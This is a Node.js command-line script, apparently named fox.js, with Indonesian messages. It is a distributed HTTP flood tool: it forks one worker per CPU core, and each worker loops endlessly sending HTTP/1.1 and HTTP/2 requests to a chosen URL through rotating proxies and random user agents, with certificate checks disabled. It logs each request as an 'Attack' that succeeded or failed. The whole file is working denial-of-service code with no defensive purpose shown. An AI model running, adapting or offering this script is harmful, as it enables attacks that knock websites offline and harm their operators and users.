const axios = require('axios');
const fs = require('fs');
const https = require('https');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const crypto = require('crypto');
const url = require('url');
const cluster = require('cluster');
const os = require('os');

const TARGET_URL = process.argv[2];
const DURATION = parseInt(process.argv[3], 10) * 1000;

if (!TARGET_URL || !DURATION) {
    console.error('❌ Usage: node fox.js <url> <time>');
    process.exit(1);
}

const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(line => line.trim() !== '');
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(line => line.trim() !== '');

if (proxies.length === 0 || userAgents.length === 0) {
    console.error('❌ Pastikan proxy.txt dan ua.txt memiliki isi!');
    process.exit(1);
}

const NUM_WORKERS = os.cpus().length;

const getRandomItem = (array) => array[Math.floor(Math.random() * array.length)];

const generateTLSOptions = () => {
    return {
        rejectUnauthorized: false,
        secureProtocol: 'TLS_method',
        ciphers: crypto.randomBytes(16).toString('hex'),
        ecdhCurve: 'auto',
        secureOptions: tls.constants.SSL_OP_NO_SSLv2 | tls.constants.SSL_OP_NO_SSLv3,
    };
};

const generateHeaders = (userAgent) => ({
    'User-Agent': userAgent,
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept': '*/*',
});

if (cluster.isMaster) {
    console.log(`🌐 Target: ${TARGET_URL}`);
    console.log(`⏳ Duration: ${DURATION / 1000} seconds`);
    console.log(`👨‍💻 Workers: ${NUM_WORKERS}`);

    // Fork workers sebanyak core CPU
    for (let i = 0; i < NUM_WORKERS; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died`);
    });

    setTimeout(() => {
        console.log('✅ Testing selesai. Semua worker dihentikan.');
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    }, DURATION);
} else {
    console.log(`Worker ${process.pid} mulai mengirim request...`);

    const sendHttpRequest = async (proxy, userAgent) => {
        const [host, port] = proxy.split(':');
        const httpsAgent = new https.Agent({
            host,
            port,
            keepAlive: true,
            ...generateTLSOptions(),
        });

        try {
            await axios.get(TARGET_URL, {
                headers: generateHeaders(userAgent),
                httpsAgent,
                timeout: 5000,
            });
            console.log(`Worker ${process.pid}: Attack sukses dengan proxy ${proxy}`);
        } catch (err) {
            console.error(`Worker ${process.pid}: Attack gagal dengan proxy ${proxy} - ${err.message}`);
        }
    };

    const sendHttp2Request = async (proxy, userAgent) => {
        const [host, port] = proxy.split(':');
        const client = http2.connect(TARGET_URL, {
            createConnection: () => tls.connect({ host, port, ...generateTLSOptions() }),
        });

        client.on('error', (err) => console.error(`HTTP2 Error: ${err.message}`));

        const req = client.request(generateHeaders(userAgent));
        req.setEncoding('utf8');
        req.on('data', () => {});
        req.on('end', () => client.close());
        req.end();
    };
    const startAttack = async () => {
        while (true) {
            const proxy = getRandomItem(proxies);
            const userAgent = getRandomItem(userAgents);
            const method = Math.random() > 0.5 ? sendHttpRequest : sendHttp2Request;
            await method(proxy, userAgent);
        }
    };

    startAttack();
}
